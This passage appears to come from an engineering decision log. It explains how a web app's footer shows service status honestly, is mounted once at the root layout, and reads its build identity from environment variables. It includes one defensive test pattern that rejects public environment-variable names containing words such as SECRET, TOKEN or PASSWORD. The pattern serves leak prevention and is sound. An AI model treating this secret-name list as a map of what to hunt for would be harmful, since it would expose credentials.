| `unknown` | **the check itself failed.** We do not know, and we say so |
| `checking` | in flight |

**"unknown" is never rendered as "offline".** A failed check is a fact about our
knowledge, not about the service, and INV-5 does not stop at the map. A DNS
failure, a blocked request or an offline browser all produce `unknown`; only an
actual timeout produces `waking`, because a timeout on a known free service *is*
a cold start.

The engine dot reads the proxy's own `engine: "offline"` field (DEC-017's
degradation contract) and translates it to **waking** rather than passing it
through — a cold engine on the free tier is the overwhelmingly likely cause, and
that is knowledge, unlike a failed check.

Every dot carries its state as **text** beside the colour, so a colour-blind
reader and a screen reader get the same fact.

#### Mounted once, at the root

The footer is mounted in `app/layout.tsx`, so it is on every page **by
construction** rather than by everyone remembering to add it. Three routes own
the full viewport and render a one-line slim variant inside their own shell:
`/workbench`, `/sangam`, `/command`. The root instance stands down for those,
and the decision lives in the footer itself rather than in three shells,
because the reason belongs with the component that knows it — a six-column
footer under a 3D graph takes vertical space from the evidence to display a
copyright notice.

Two routes needed the slim variant added explicitly, found by walking every
route in a browser rather than by assuming: **`/workbench/classic`**, which the
workspace shell deliberately renders bare, and **`/command`**, which owns its
own layout. Without those, the cockpit and the admin panel would have been the
only two pages in the product with no footer at all.

#### Build identity comes from the environment

Version, commit SHA and environment are read at build time from
`NEXT_PUBLIC_BUILD_*`, with `NEXT_PUBLIC_VERCEL_GIT_COMMIT_SHA` and
`NEXT_PUBLIC_RENDER_GIT_COMMIT` as platform fallbacks so the footer is correct
wherever it is deployed. Where a value is genuinely absent it renders **"build
details not reported"** — never a placeholder. A version typed into a source
file is wrong the moment someone forgets to bump it, and a footer confidently
displaying the wrong commit tells a judge the deployment is something it is not.

The environment is deliberately **not** keyed to `NODE_ENV`: `next start`
reports "production" for a local run over plain HTTP — the same mismatch that
broke the session cookie in DEC-059 — and a footer keyed to it would tell an
analyst on localhost they were looking at production.

#### `NEXT_PUBLIC_` widened, deliberately

INV-2's test previously asserted that *only* feature flags carried the prefix.
Build identity now does too, which is legitimate: a commit SHA is in the public
repository and an environment name is visible from the URL, and both must render
in a footer the browser draws. The allowlist is pinned so adding one is a
reviewed act, and a second test rejects the *shape* of a mistake — any
`NEXT_PUBLIC_` name matching `SECRET|KEY|TOKEN|PASSWORD|PEPPER|CREDENTIAL|PRIVATE`
fails, even if someone updates the list without thinking.

lucide icons only, skin tokens only, no hardcoded hex — so the footer reskins
with the product and passes the Phase 1 semantic-token test. `role="contentinfo"`,
and every external link announced as such.

**Measured:** 33 footer unit tests, 16 e2e checks across eight routes, both dots
resolving live against the real v1 deployment and the real engine.
